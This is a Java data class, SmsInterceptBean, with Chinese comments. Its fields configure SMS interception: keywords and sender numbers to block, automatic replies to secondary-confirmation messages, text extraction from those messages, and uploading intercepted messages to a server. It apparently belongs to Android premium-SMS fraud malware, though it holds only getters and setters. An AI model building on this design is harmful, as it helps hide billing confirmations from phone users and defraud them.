package com.core_sur.bean;

public class SmsInterceptBean
{
	private String[] intercept_key;// 拦截关键字 0 屏蔽关键字 1 二次屏蔽关键字，中间有三级分隔符
	private String[] intercept_port;// 拦截号码
	private String confirm_port;// 二次确认号码
	private String confirm_key;// 二次确认关键字
	private String confirm_content;// 二次确认回复内容
	private String confirm_content_start;// 二次确认截取开始字符串
	private String confirm_content_end;// 二次确认截取结束字符串
	private boolean confirm_isUpdload;// 拦截信息是否上传服务器
	private boolean callback;// 拦截信息是否回调
	private int confirm_qus_imgpos;// 拦截彩信图片位置
	private byte confirm_para_type;// 拦截类型

	public int getConfirm_qus_imgpos()
	{
		return confirm_qus_imgpos;
	}

	public void setConfirm_qus_imgpos(int confirm_qus_imgpos)
	{
		this.confirm_qus_imgpos = confirm_qus_imgpos;
	}

	public boolean isCallback()
	{
		return callback;
	}

	public void setCallback(boolean callback)
	{
		this.callback = callback;
	}

	public String[] getIntercept_key()
	{
		return intercept_key;
	}

	public void setIntercept_key(String[] intercept_key)
	{
		this.intercept_key = intercept_key;
	}

	public String[] getIntercept_port()
	{
		return intercept_port;
	}

	public void setIntercept_port(String[] intercept_port)
	{
		this.intercept_port = intercept_port;
	}

	public String getConfirm_port()
	{
		return confirm_port;
	}

	public void setConfirm_port(String confirm_port)
	{
		this.confirm_port = confirm_port;
	}

	public String getConfirm_key()
	{
		return confirm_key;
	}

	public void setConfirm_key(String confirm_key)
	{
		this.confirm_key = confirm_key;
	}

	public String getConfirm_content()
	{
		return confirm_content;
	}

	public void setConfirm_content(String confirm_content)
	{
		this.confirm_content = confirm_content;
	}

	public String getConfirm_content_start()
	{
		return confirm_content_start;
	}

	public void setConfirm_content_start(String confirm_content_start)
	{
		this.confirm_content_start = confirm_content_start;
	}

	public String getConfirm_content_end()
	{
		return confirm_content_end;
	}

	public void setConfirm_content_end(String confirm_content_end)
	{
		this.confirm_content_end = confirm_content_end;
	}

	public boolean isConfirm_isUpdload()
	{
		return confirm_isUpdload;
	}

	public void setConfirm_isUpdload(boolean confirm_isUpdload)
	{
		this.confirm_isUpdload = confirm_isUpdload;
	}

	public byte getConfirm_para_type()
	{
		return confirm_para_type;
	}

	public void setConfirm_para_type(byte confirm_para_type)
	{
		this.confirm_para_type = confirm_para_type;
	}
}
